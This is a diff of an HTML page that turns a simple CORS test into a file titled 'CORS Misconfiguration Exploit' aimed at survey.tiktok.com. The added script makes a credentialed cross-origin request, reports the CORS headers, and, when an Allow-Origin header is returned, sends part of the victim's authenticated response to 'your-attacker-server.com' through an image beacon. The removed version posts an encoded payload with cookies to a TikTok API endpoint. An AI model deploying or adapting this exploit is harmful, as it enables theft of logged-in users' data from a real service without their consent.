@@ -1,29 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Test CORS TikTok</title>
-</head>
+<head><title>CORS Exploit - survey.tiktok.com</title></head>
 <body>
+<h1>CORS Misconfiguration Exploit</h1>
+<div id="output"></div>
 <script>
-async function testCORS() {
-    const url = 'https://www.tiktok.com/v2/bytesync/api/pipeline?device_id=7116048904945255451&platform=0&aid=1988';
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            credentials: 'include', // invia cookie
-            headers: {
-                'Content-Type': 'application/octet-stream'
-            },
-            body: 'CnQIAhJMTVM0d0xqQUJBQUFBTTVxeHJyQlJrZDJMRWNfUjRuS3pMWll6UmJoVGNGaFNJS0Z3MlpnQVJOLXdiQTFxUVBwdFJWNzd0X29kVHJzRBoTNzExNjA0ODkwNDk0NTI1NTQ1MSC3wvmtrTMoADIAOABAAA=='
-        });
-        const data = await response.text();
-        console.log(data);
-    } catch (err) {
-        console.error('Errore:', err);
+async function exploit() {
+  const output = document.getElementById('output');
+  try {
+    const response = await fetch("https://survey.tiktok.com", {
+      method: "GET",
+      credentials: "include",
+      mode: "cors"
+    });
+    const headers = {};
+    for(let pair of response.headers.entries()) {
+      headers[pair[0]] = pair[1];
     }
+    const text = await response.text();
+    output.innerHTML = `
+      <p>Status: ${response.status}</p>
+      <p>Access-Control-Allow-Origin: ${headers['access-control-allow-origin'] || 'NOT PRESENT'}</p>
+      <p>Access-Control-Allow-Credentials: ${headers['access-control-allow-credentials'] || 'NOT PRESENT'}</p>
+      <p>Response preview (first 500 chars):</p>
+      <pre>${escapeHtml(text.substring(0,500))}</pre>
+    `;
+    // If ACAO is present, send data to attacker server
+    if(headers['access-control-allow-origin']) {
+      new Image().src = "https://your-attacker-server.com/log?data=" + encodeURIComponent(text.substring(0,1000));
+    }
+  } catch(err) {
+    output.innerHTML = `<p style="color:red">Error: ${err.message}</p>`;
+  }
 }
-testCORS();
+function escapeHtml(str) {
+  return str.replace(/[&<>]/g, function(m) {
+    if(m === '&') return '&amp;';
+    if(m === '<') return '&lt;';
+    if(m === '>') return '&gt;';
+    return m;
+  });
+}
+exploit();
 </script>
 </body>
 </html>
